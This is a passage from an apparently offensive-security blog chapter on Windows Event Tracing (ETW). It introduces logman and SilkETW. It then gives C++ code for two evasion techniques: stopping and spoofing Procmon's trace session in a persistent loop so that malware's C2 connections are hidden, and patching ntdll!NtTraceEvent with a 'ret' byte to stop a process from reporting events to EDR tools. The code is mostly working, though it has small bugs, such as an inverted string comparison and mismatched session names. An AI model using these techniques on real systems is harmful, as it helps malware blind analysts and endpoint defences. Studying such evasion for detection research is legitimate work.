<p>Likewise, a provider can be removed using the following command:</p>
<pre><code class="lang-powershell">logman update trace ${tracingSessionName} --p ${providerName} ${eventValue} -ets
</code></pre>
<p>The tracing session can be stopped using :</p>
<pre><code class="lang-powershell">logman stop spotless-tracing -ets
</code></pre>
<p>The tracing session creates an <code>etl</code> file that can be viewed with <code>Event Viewer</code>.</p>
<h1 id="silketw">SilkETW</h1>
<p><a href="https://github.com/mandiant/SilkETW" target="_blank">SilkETW</a> is a tool allowing simple access to <code>ETW</code> events. Indeed, even if <code>logman</code> is quite interesting to inspect providers and tracing sessions, it is not really flexible and easy to use. Moreover, logman can be resource consuming as it logs events system wide.</p>
<p><code>SilkETW</code> can be used to access to a specific provider and retrieve events either from userland or kerneland providers.</p>
<p>The tool will connect to a specific provider and dump the event in a file <code>JSON</code> formatted that can be easily displayed using a simple text editor.</p>
<p>For example, the following <code>JSON</code> represents an event raised by the kernel during a <code>VirtualAlloc</code> execution:</p>
<pre><code class="lang-json">{
  <span class="hljs-string">&quot;ProviderGuid&quot;</span>: <span class="hljs-string">&quot;9e814aad-3204-11d2-9a82-006008a86939&quot;</span>,
  <span class="hljs-string">&quot;YaraMatch&quot;</span>: [],
  <span class="hljs-string">&quot;ProviderName&quot;</span>: <span class="hljs-string">&quot;MSNT_SystemTrace&quot;</span>,
  <span class="hljs-string">&quot;EventName&quot;</span>: <span class="hljs-string">&quot;PageFault/VirtualAlloc&quot;</span>,
  <span class="hljs-string">&quot;Opcode&quot;</span>: <span class="hljs-number">98</span>,
  <span class="hljs-string">&quot;OpcodeName&quot;</span>: <span class="hljs-string">&quot;VirtualAlloc&quot;</span>,
  <span class="hljs-string">&quot;TimeStamp&quot;</span>: <span class="hljs-string">&quot;2022-09-08T14:30:15.9588384+02:00&quot;</span>,
  <span class="hljs-string">&quot;ThreadID&quot;</span>: <span class="hljs-number">37036</span>,
  <span class="hljs-string">&quot;ProcessID&quot;</span>: <span class="hljs-number">35088</span>,
  <span class="hljs-string">&quot;ProcessName&quot;</span>: <span class="hljs-string">&quot;HTTP&quot;</span>,
  <span class="hljs-string">&quot;PointerSize&quot;</span>: <span class="hljs-number">8</span>,
  <span class="hljs-string">&quot;EventDataLength&quot;</span>: <span class="hljs-number">24</span>,
  <span class="hljs-string">&quot;XmlEventData&quot;</span>: {
    <span class="hljs-string">&quot;ProviderName&quot;</span>: <span class="hljs-string">&quot;MSNT_SystemTrace&quot;</span>,
    <span class="hljs-string">&quot;ProcessId&quot;</span>: <span class="hljs-string">&quot;35,088&quot;</span>,
    <span class="hljs-string">&quot;EventName&quot;</span>: <span class="hljs-string">&quot;PageFault/VirtualAlloc&quot;</span>,
    <span class="hljs-string">&quot;PID&quot;</span>: <span class="hljs-string">&quot;35088&quot;</span>,
    <span class="hljs-string">&quot;Flags&quot;</span>: <span class="hljs-string">&quot;12,288&quot;</span>,
    <span class="hljs-string">&quot;TID&quot;</span>: <span class="hljs-string">&quot;37036&quot;</span>,
    <span class="hljs-string">&quot;BaseAddress&quot;</span>: <span class="hljs-string">&quot;0x1094a030000&quot;</span>,
    <span class="hljs-string">&quot;RegionSize&quot;</span>: <span class="hljs-string">&quot;0x1000&quot;</span>,
    <span class="hljs-string">&quot;MSec&quot;</span>: <span class="hljs-string">&quot;10155.6890&quot;</span>,
    <span class="hljs-string">&quot;PName&quot;</span>: <span class="hljs-string">&quot;HTTP&quot;</span>
  }
}
</code></pre>
<p>The <code>Github</code> documentation is well written and contains all the information needed to use the tool.</p>
<h1 id="procmon">Procmon</h1>
<p><code>Procmon</code> is a tool from the <code>SysInternal Suite</code> that allows monitoring events system wide. In order to catch events, <code>Procmon</code> leverage the following techniques:</p>
<ul>
<li>System minifilters</li>
<li>Registry minifilters</li>
<li>Process and thread callback</li>
<li>ETW for network events</li>
</ul>
<h2 id="blinding-procmon">Blinding Procmon</h2>
<p>For some events such as the <code>TCP</code> connections, <code>Procmon</code> use the <code>ETW</code> events. Indeed, when using <code>logman</code> with <code>Procmon</code> launched, the <code>Procmon</code> <code>Event Tracing Session</code> can be found:</p>
<pre><code class="lang-powershell">logman query -ets | <span class="hljs-built_in">Select-String</span> PROCMON
<span class="hljs-comment"># PROCMON TRACE                           Trace                         Running</span>
</code></pre>
<p>The goal is to be able to remove <code>TCP</code> and <code>UDP</code> entries from a <code>Procmon</code> tracing session.</p>
<p>The <code>Pocmon</code> tracing session can be easily stopped using logman :</p>
<pre><code>logman stop &quot;PROCMON TRACE&quot; -ets
</code></pre><p>Once the session is stopped, <code>Procmon</code> is not able to log network events anymore as it only uses <code>ETW</code> to collect these events.</p>
<h2 id="automating-the-process">Automating the process</h2>
<p>Using <code>logman</code> to blind <code>Procmon</code> is a nice proof of concept, however, a simple restart of <code>Procmon</code> fixes the problem as the session is restarted by the software.</p>
<p>The idea now is to be able to permanently blind <code>Procmon</code>. A use case is a malware performing network connection with a remote <code>C2</code>. Blinding <code>Procmon</code> will make the malware reversing less obvious. Indeed, there are several other tools that can be used to detect network connections performed, but it is a first step and as said before, a simnple proof of concept on <code>ETW</code> vulnerabilties.</p>
<p>When <code>Procmon</code> is launched, it will automatically create a tracing session named <code>PROCMON TRACE</code>. this session is automatically killed when <code>Procmon</code> is closed. Thus, the idea is to list the different tracing session, and when a <code>Procmon</code> tracing session is found, the program will kill it and recreate a new one not linked to any provider.</p>
<p>As the new tracing session will not be linked to any provider, it will not forward any events to <code>Procmon</code>.</p>
<p>The <code>Win32 API</code> contains several functions to play with <code>ETW</code> tracing sessions:</p>
<ul>
<li><code>StartTrace</code>: start a new tracing session</li>
<li><code>StopTrace</code> and <code>ControlTrace</code> : stop a given tracing session</li>
<li><code>QueryTrace</code> : retrieve the settings, properties and statistics of a tracing session</li>
<li><code>QueryAllTrace</code> : retrieve the settings, properties and statistics of all active tracing session</li>
<li><code>PEVENT_TRACE_PROPERTIES</code> : object used to store trace properties and statistics</li>
</ul>
<h3 id="detect-procmon-tracing-session">Detect Procmon tracing session</h3>
<p>First of all, an array of <code>PEVENT_TRACE_PROPERTIES</code> objects must be initialized:</p>
<pre><code class="lang-cpp"><span class="hljs-comment">// By default, Windows does not support more than 64 parallele tracing sessions</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXIMUM_LOGGERS 64</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXSTR 1024</span>

<span class="hljs-comment">// Array containing all tracing sessions</span>
PEVENT_TRACE_PROPERTIES  tracingSessions[MAXIMUM_LOGGERS];

<span class="hljs-comment">// Object representing a single tracing session</span>
ULONG SizeForOneProperty = <span class="hljs-keyword">sizeof</span>(EVENT_TRACE_PROPERTIES) + <span class="hljs-number">2</span> * <span class="hljs-function">MAXSTR * <span class="hljs-title">sizeof</span><span class="hljs-params">(TCHAR)</span></span>;
ULONG SizeNeeded = MAXIMUM_LOGGERS * SizeForOneProperty;
PEVENT_TRACE_PROPERTIES singleTracingSession = (PEVENT_TRACE_PROPERTIES)<span class="hljs-built_in">malloc</span>(SizeNeeded);

<span class="hljs-comment">// Initializing tracingSessions internal structures</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> LoggerCounter = <span class="hljs-number">0</span>; LoggerCounter &lt; MAXIMUM_LOGGERS; LoggerCounter++) {
      singleTracingSession-&gt;Wnode.BufferSize = SizeForOneProperty;
        singleTracingSession-&gt;LoggerNameOffset = <span class="hljs-keyword">sizeof</span>(EVENT_TRACE_PROPERTIES);
        singleTracingSession-&gt;LogFileNameOffset = <span class="hljs-keyword">sizeof</span>(EVENT_TRACE_PROPERTIES) + <span class="hljs-function">MAXSTR * <span class="hljs-title">sizeof</span><span class="hljs-params">(TCHAR)</span></span>;

    <span class="hljs-comment">// Set the value in the global tracing session array</span>
    tracingSessions[LoggerCounter] = singleTracingSession;
    <span class="hljs-comment">// Jump to the next tracing session to initialize</span>
        singleTracingSession = (PEVENT_TRACE_PROPERTIES)((PUCHAR)singleTracingSession + singleTracingSession-&gt;Wnode.BufferSize);
}
</code></pre>
<p>Now the array <code>tracingSessions</code> is initialized, it can be populated using the <code>Win32 API</code>:</p>
<pre><code class="lang-cpp"><span class="hljs-comment">// Fill the tracingSessions array with all active sessions information</span>
ULONG numberOfTracingSessions;
Status = QueryAllTraces(
  tracingSessions,
  MAXIMUM_LOGGERS,
  &amp;numberOfTracingSessions
);
</code></pre>
<p>From now, the <code>tracingSessions</code> object contains at least the name of all active tracing sessions accessible to the process.</p>
<p>Indeed, some tracing sessions can only be accessed by a high integrity process.</p>
<p>Let&#x2019;s find the <code>Procmon</code> tracing session:</p>
<pre><code class="lang-cpp"><span class="hljs-comment">// variable containing the tracing session name</span>
LPTSTR sessionName;
<span class="hljs-keyword">for</span>(<span class="hljs-keyword">size_t</span> tracingCount; tracingCount &lt; numberOfTracingSessions; tracingCount ++){
  <span class="hljs-comment">// Check if the tracing property contains the tracing session name</span>
  <span class="hljs-comment">// and store it in sessionName if it exists.</span>
  <span class="hljs-keyword">if</span> ((tracingSessions[tracingCount]-&gt;LoggerNameOffset &gt; <span class="hljs-number">0</span>) &amp;&amp; (tracingSessions[tracingCount]-&gt;LoggerNameOffset &lt; tracingSessions[tracingCount]-&gt;Wnode.BufferSize)) {
    sessionName = (LPTSTR)((PUCHAR)tracingSessions[tracingCount] + tracingSessions[tracingCount]-&gt;LoggerNameOffset);
  }
  <span class="hljs-keyword">else</span> {
    sessionName = <span class="hljs-literal">NULL</span>;
  }

  <span class="hljs-comment">// Check if it is the Procmon tracing session</span>
  <span class="hljs-keyword">if</span>(_tcscmp(sessionName, <span class="hljs-string">L&quot;PROCMON_TRACE&quot;</span>)){
    <span class="hljs-comment">// start the attack</span>
    PEVENT_TRACE_PROPERTIES procmonTracingSession = tracingSessions[tracingCount];
    ...
    <span class="hljs-keyword">break</span>;
  }

}
</code></pre>
<p>Now the <code>Procmon</code> tracing session is found, let&#x2019;s run the attack !</p>
<h3 id="kill-procmon-tracing-session">Kill Procmon tracing session</h3>
<p>The first thing to do is to kill the <code>Procmon</code> tracing session:</p>
<pre><code class="lang-cpp">ULONG status = StopTraceW((TRACEHANDLE)<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;PROCMON TRACE&quot;</span>, procmonTracingSession);
</code></pre>
<p>And that&apos;s it... The <code>StopTraceW</code> <code>Win32 API</code> will do all the work and kill the tracing session. Just check the returned status to verify nothing goes wrong.</p>
<p>At this moment <code>Procmon</code> should not be able to monitor network events anymore.</p>
<p>Let&#x2019;s create a fake tracing session mimicking the <code>Procmon</code> legit tracing session.</p>
<h3 id="create-a-new-tracing-session">Create a new tracing session</h3>
<p>First of all, a <code>PEVENT_TRACE_PROPERTIES</code> object must be initialized as shown in the first part:</p>
<pre><code class="lang-cpp"><span class="hljs-comment">// Size allocated in the property object</span>
ULONG SizeNeeded = <span class="hljs-keyword">sizeof</span>(EVENT_TRACE_PROPERTIES) + <span class="hljs-number">2</span> * <span class="hljs-function">MAXSTR * <span class="hljs-title">sizeof</span><span class="hljs-params">(TCHAR)</span></span>;

<span class="hljs-comment">// Object handling the tracing session properties</span>
PEVENT_TRACE_PROPERTIES newTracingSession = (PEVENT_TRACE_PROPERTIES)<span class="hljs-built_in">malloc</span>(SizeNeeded);
RtlZeroMemory(newTracingSession, SizeNeeded);

newTracingSession-&gt;Wnode.BufferSize = SizeNeeded;

<span class="hljs-comment">// Set the same expected `GUID`</span>
GUID  procMonGuid = { <span class="hljs-number">0x75955553</span>, <span class="hljs-number">0x2055</span>, <span class="hljs-number">0x11ED</span>, { <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xF6</span> } }
newTracingSession-&gt;Wnode.Guid = procMonGuid;

<span class="hljs-comment">// This information can be extracted using logman on the legit Procmon tracing session</span>
newTracingSession-&gt;Wnode.ClientContext = <span class="hljs-number">1</span>;
newTracingSession-&gt;Wnode.Flags = EVENT_TRACE_FLAG_IMAGE_LOAD;
newTracingSession-&gt;LogFileMode = EVENT_TRACE_FILE_MODE_SEQUENTIAL;

newTracingSession-&gt;LoggerNameOffset = <span class="hljs-keyword">sizeof</span>(EVENT_TRACE_PROPERTIES);
newTracingSession-&gt;LogFileNameOffset = newTracingSession-&gt;LoggerNameOffset + <span class="hljs-function">MAXSTR * <span class="hljs-title">sizeof</span><span class="hljs-params">(TCHAR)</span></span>;

newTracingSession-&gt;MaximumBuffers = <span class="hljs-number">54</span>;

tracingSessionName = (LPTSTR)((PCHAR)newTracingSession + newTracingSession-&gt;LoggerNameOffset);
logFileName = (LPTSTR)((PCHAR)newTracingSession + newTracingSession-&gt;LogFileNameOffset);

<span class="hljs-comment">// Set the tracing session name and the log storing path</span>
_tcscpy_s(logFileName, MAXSTR, _T(<span class="hljs-string">&quot;C:\\LogFile.Etl&quot;</span>));
_tcscpy_s(tracingSessionName, MAXSTR, <span class="hljs-string">L&quot;PROCMON_TRACE&quot;</span>);
</code></pre>
<p>The tracing session object is initialized. Let&#x2019;s register this new tracing session using the <code>Win32 API</code>:</p>
<pre><code class="lang-cpp">TRACEHANDLE tracingSessionHandle = <span class="hljs-number">0</span>;
ULONG status = StartTraceW(&amp;tracingSessionHandle, tracingSessionName, newTracingSession);
</code></pre>
<p>And that&apos;s it. The <code>StartTraceW</code> <code>Win32 API</code> will handle everything and start the tracing session.</p>
<h3 id="make-it-persistent">Make it persistent</h3>
<p>If you try the previous code, it will do the same thing that what have been done using <code>logman</code> thus, any <code>Procmon</code> restart will erase the modification and re-allows it to monitor network events.</p>
<p>In order to make the change persistent, it is possible to loop the whole attack:</p>
<pre><code class="lang-cpp"><span class="hljs-comment">// pseudo code</span>
<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>){
  <span class="hljs-comment">// Check if any procmon tracing session exist</span>
  <span class="hljs-keyword">if</span>(!isActiveProcmonTracingSession){
    sleep(<span class="hljs-number">2000</span>);
    <span class="hljs-keyword">continue</span>;
  }
  <span class="hljs-comment">// Retrieve the procmon tracing session</span>
  procmonTracingSession = getProcmonTracingSession();
  <span class="hljs-comment">// Stop it</span>
  stopProcmonTracingSession(procmonTracingSession);
  <span class="hljs-comment">// Create a fake one</span>
  createNewProcmonTracingSession(procmonTracingSession);
  <span class="hljs-comment">// Wait until the fake one is deleted by procmon</span>
  waitUntilProcmonSessionExists();
}
</code></pre>
<h3 id="limits">Limits</h3>
<p>This attack is interesting to understand how <code>ETW</code> can be used by software (such as <code>EDR</code>) to monitor processes execution through <code>ETW</code> and how malwares can try to evade <code>ETW</code> monitoring by tampering tracing sessions established.</p>
<p>The problem with <code>ETW</code> is that tracing sessions are global among the system and the modification performed by a given userland process could impact the whole detection mechanism system wide. However, several protection can be set up to avoid tracing session tampering by unprivileged process.</p>
<p>Indeed, some tracing session and providers can only be registered or updated by <code>Protected Process Light</code> or <code>PPL</code> processes. A good example is <code>Defender ATP</code> tracing sessions and providers. Even a <code>high integrity</code> process is not able to tamper the <code>Defender</code> tracing session.</p>
<p>Of course, <code>PPL</code> limitation is not fully secured as driver code or exploit could allow a malicious process to bypass the security but it is a start.</p>
<h1 id="patching-etw">Patching ETW</h1>
<p>The previous technique, focusing <code>Procmon</code> tracing session, leverages the fact that tracing sessions can be tampered by any process with the necessary privileges to access to the tracing session.</p>
<p>The following technique will not tamper the tracing sessions but the way a process reports events to the providers.</p>
<p>Indeed, the events are raised by the different processes and written in the providers. If the process is unable to write a new event in the providers, the security applications such as <code>EDR</code> cannot retrieve and analyze these events.</p>
<h2 id="writing-event-to-a-provider">Writing event to a provider</h2>
<p>The idea is to patch the <code>Win32 API</code> used to write event on the provider.</p>
<p>It is maybe possible to retrieve the <code>Win32 API</code> through documentation, but as everyone knows, 3 hours of debugging can avoid 15 minutes reading documentation. Thus let&#x2019;s drop <code>Microsoft</code> documentation and fire up the debugger.</p>
<h3 id="finding-the-api">Finding the API</h3>
<p>In order to find the <code>API</code> responsible for event writing, let&#x2019;s use a simple code that generates an easy-to-catch event.</p>
<p>Using <code>logman</code> the following provider is found:</p>
<pre><code>Microsoft-Windows-WinHttp                {7D44233D-3055-4B9C-BA64-0D47CA40A232}
</code></pre><p>This provider is interesting as it is only used when <code>WinHTTP</code> <code>API</code> is used. </p>
<p>Then, a simple code sending an <code>HTTP</code> request using the <code>WinHTTP API</code>:</p>
<pre><code class="lang-cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;winhttp.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-string">&quot;winhttp.lib&quot;</span>)</span>
<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{

    DWORD dwSize = <span class="hljs-number">0</span>;
    DWORD dwDownloaded = <span class="hljs-number">0</span>;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = <span class="hljs-literal">NULL</span>,
        hConnect = <span class="hljs-literal">NULL</span>,
        hRequest = <span class="hljs-literal">NULL</span>;

    <span class="hljs-comment">// Use WinHttpOpen to obtain a session handle.</span>
    hSession = WinHttpOpen(<span class="hljs-string">L&quot;WinHTTP Example/1.0&quot;</span>,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, <span class="hljs-number">0</span>);

    <span class="hljs-comment">// Specify an HTTP server.</span>
    <span class="hljs-keyword">if</span> (hSession)
        hConnect = WinHttpConnect(hSession, <span class="hljs-string">L&quot;www.microsoft.com&quot;</span>,
            INTERNET_DEFAULT_HTTPS_PORT, <span class="hljs-number">0</span>);

    <span class="hljs-comment">// Create an HTTP request handle.</span>
    <span class="hljs-keyword">if</span> (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, <span class="hljs-string">L&quot;GET&quot;</span>, <span class="hljs-literal">NULL</span>,
            <span class="hljs-literal">NULL</span>, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            WINHTTP_FLAG_SECURE);

    <span class="hljs-comment">// Send a request.</span>
    <span class="hljs-keyword">if</span> (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, <span class="hljs-number">0</span>,
            WINHTTP_NO_REQUEST_DATA, <span class="hljs-number">0</span>,
            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);


    <span class="hljs-comment">// End the request.</span>
    <span class="hljs-keyword">if</span> (bResults)
        bResults = WinHttpReceiveResponse(hRequest, <span class="hljs-literal">NULL</span>);

    <span class="hljs-comment">// Keep checking for data until there is nothing left.</span>
    <span class="hljs-keyword">if</span> (bResults)
    {
        <span class="hljs-keyword">do</span>
        {
            <span class="hljs-comment">// Check for available data.</span>
            dwSize = <span class="hljs-number">0</span>;
            <span class="hljs-keyword">if</span> (!WinHttpQueryDataAvailable(hRequest, &amp;dwSize))
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error %u in WinHttpQueryDataAvailable.\n&quot;</span>,
                    GetLastError());

            <span class="hljs-comment">// Allocate space for the buffer.</span>
            pszOutBuffer = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[dwSize + <span class="hljs-number">1</span>];
            <span class="hljs-keyword">if</span> (!pszOutBuffer)
            {
                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Out of memory\n&quot;</span>);
                dwSize = <span class="hljs-number">0</span>;
            }
            <span class="hljs-keyword">else</span>
            {
                <span class="hljs-comment">// Read the data.</span>
                ZeroMemory(pszOutBuffer, dwSize + <span class="hljs-number">1</span>);

                <span class="hljs-keyword">if</span> (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &amp;dwDownloaded))
                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error %u in WinHttpReadData.\n&quot;</span>, GetLastError());
                <span class="hljs-keyword">else</span>
                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, pszOutBuffer);

                <span class="hljs-comment">// Free the memory allocated to the buffer.</span>
                <span class="hljs-keyword">delete</span>[] pszOutBuffer;
            }
        } <span class="hljs-keyword">while</span> (dwSize &gt; <span class="hljs-number">0</span>);
    }


    <span class="hljs-comment">// Report any errors.</span>
    <span class="hljs-keyword">if</span> (!bResults)
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error %d has occurred.\n&quot;</span>, GetLastError());

    <span class="hljs-comment">// Close any open handles.</span>
    <span class="hljs-keyword">if</span> (hRequest) WinHttpCloseHandle(hRequest);
    <span class="hljs-keyword">if</span> (hConnect) WinHttpCloseHandle(hConnect);
    <span class="hljs-keyword">if</span> (hSession) WinHttpCloseHandle(hSession);

    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>Finally, <code>SilkETW</code> is used to monitor the provider:</p>
<pre><code class="lang-powershell">.\SilkETW.exe -t user -pn Microsoft-Windows-WinHttp  -ot file -p ./event.txt
</code></pre>
<p>The logfile written by <code>SilkETW</code> is <code>JSON</code> formatted and contains the <code>Process ID</code> it is thus easy to verify the event logged has been raised by our process or by another application running on the system.</p>
<p>Once <code>SilkETW</code> is launched and the test program compiled, let&#x2019;s run it to verify if an event is raised. You should see between 2 and 4 events raised. The test program will raise these events each time it is run.</p>
<p>Let&#x2019;s go step by step. First, try to identify which function raises an event. Set some <code>system(&quot;PAUSE&quot;)</code> before each function and wait for an event to be raised.</p>
<p>For example, the function <code>WinHttpSendRequest</code> will raise a single event. Let&#x2019;s use this function for the next investigations.</p>
<p>Once the function is found, we will use a debugger to follow the call stack until an event is raised. The idea is to run the debugger until a <code>call</code> raise an event.</p>
<p>Inside the <code>WINHTTP!WinHttpSendRequest</code> function, the following line raises the event:</p>
<p><img src="img/ETW/windbg.jpg" alt="Function raising an ETW event"></p>
<p>Thus, the program is restarted, a breakpoint is set in the function <code>WINHTTP!WinHttpSendRequest</code> and the code is debugged until a new event is raised.</p>
<p>After iterating this process several times, the following call stack is found:</p>
<pre><code>WINHTTP.dll
==========================================================
HTTP_USER_REQUEST::SendRequest
HTTP_USER_REQUEST::_SendRequestWithDrainComplete
HTTP_USER_REQUEST::_CallGetProxyForUrl
WxGetProxyContext::StartProxyResolve
WxProxyManager::OnProcessGetProxyForUrl
WinHttpClientCompletion::StartProxyResolve
WinHttpClientResolver::GetProxyForUrlImpl
WinHttpClientCompletion::OnProxyResolved
WinHttpClientCompletion::StateStart
McTemplateU0q_EventWriteTransfer
McGenEventWrite_EventWriteTransfer

NTDLL.dll
==========================================================
ntdll!EtwEventWriteTransfer
ntdll!EtwpEventWriteFull
ntdll!NtTraceEvent
SYSCALL
</code></pre><p>This callstack shows that the function <code>EtwEventWriteFull</code> is the <code>Win32 API</code> used to write an event in the provider when using the <code>WinHTTP API</code>. In fact, this <code>API</code> is used by every userland process. This is convenient as there is a single <code>API</code> to write events and it is located in the <code>NTDLL.DLL</code>.</p>
<p>Thus, this function can be patched to avoid process writing event in the providers.</p>
<h3 id="patch-the-dll">Patch the DLL</h3>
<p>Now we know which function is used to write events in the providers, let&#x2019;s patch it to avoid any event written by the process.</p>
<p>The patch will be a simple <code>ret</code> added at the beginning of <code>ntdll!NtTraceEvent</code>. The following code can be used to apply the patch:</p>
<pre><code class="lang-cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">patchETW</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// Retrieve the function to patch</span>
    PVOID NtTraceEvent = GetProcAddress(GetModuleHandleA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>), <span class="hljs-string">&quot;NtTraceEvent&quot;</span>);
    DWORD dwOld;
    <span class="hljs-comment">// Simple patch representing the ret instruction</span>
    DWORD retPatch = <span class="hljs-number">0xc3</span>;
    <span class="hljs-comment">// Modify page protection to be able to write the patch</span>
    <span class="hljs-comment">// PAGE_EXECUTE_READWRITE is mandatory as the function is often used</span>
    VirtualProtect((LPVOID)((DWORD64)NtTraceEvent), <span class="hljs-number">1</span>, PAGE_EXECUTE_READWRITE, &amp;dwOld);
    <span class="hljs-comment">// Write the patch</span>
    CopyMemory((LPVOID)((DWORD64)NtTraceEvent), &amp;retPatch, <span class="hljs-number">1</span>);
    <span class="hljs-comment">// Reprotect the page as PAGE_EXECUTE_READ</span>
    VirtualProtect((LPVOID)((DWORD64)NtTraceEvent), <span class="hljs-number">1</span>, dwOld, &amp;dwOld);
}
</code></pre>
<p>Once the patch is applied, the modification can be analyzed in <code>Windbg</code>:</p>
<p><img src="img/ETW/NtTraceEvent.jpg" alt="Patch in ntdll!NtTraceEvent"></p>
<p>Finally, the program is relaunched without debugger and the events are monitored using <code>SilkETW</code>. If the patch has been successfully implemented, no event should be monitored by <code>SilkETW</code>.</p>
<h3 id="limits">Limits</h3>
<p>Patching the <code>NtTraceEvent</code> function is a quick way to deactivate <code>ETW</code> events raised by the process. However, as the <code>NTDLL.dll</code> is patched, any <code>EDR</code> performing integrity check will raise an alert. Likewise, in order to patch the <code>API</code>, the page protection is set as <code>PAGE_EXECUTE_READWRITE</code> during the patch writing, an <code>EDR</code> could find the action suspicious and raise an alert.</p>
<p>However, the most important limit is that this attack will only patch event raised in usermode. Indeed, every event raised by kernel functions such as <code>VirtualAlloc</code> or network primitives cannot be avoided with this technique.</p>
<p>Indeed, if you patch the <code>ETW</code> with this technique and you launch <code>Procmon</code>, it will still log the <code>TCP</code> connections performed as it uses <code>ETW</code> events raised by the kernel only. In order to fully patch <code>ETW</code>  a driver must be used. Fortunately, <code>ETW</code> structures are not monitored by <code>KPP</code> and can be patched without triggering a <code>BSOD</code>. But this will be a part of another blogpost...</p>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="Elastic EDR.html" class="navigation navigation-prev " aria-label="Previous page: Elastic EDR">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="Function hooking.html" class="navigation navigation-next " aria-label="Next page: Function Hooking">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"ETW","level":"2.1.5","depth":2,"next":{"title":"Function Hooking","level":"2.1.6","depth":2,"path":"Malware/Function hooking.md","ref":"Malware/Function hooking.md","articles":[]},"previous":{"title":"Elastic EDR","level":"2.1.4","depth":2,"path":"Malware/Elastic EDR.md","ref":"Malware/Elastic EDR.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-sharing","collapsible-chapters@git+https://gitlab.dqr/gitbook-plugin/collapsible-chapters.git#main","copy-code-button@git+https://gitlab.dqr/gitbook-plugin/copy-code-button.git#main","hide-published-with","search-plus","simple-page-toc"],"pluginsConfig":{"github":{"url":"https://github.com/YoannDqr"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"search":{},"collapsible-chapters":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"hide-published-with":{},"fontsettings":{"theme":"white","family":"sans","size":2},"twitter":{"url":"https://twitter.com/HackerOtter"},"highlight":{},"copy-code-button":{},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Malware/ETW.md","mtime":"2022-09-23T14:19:14.844Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-12-26T15:32:49.652Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-copy-code-button/toggle.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-hide-published-with/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
        
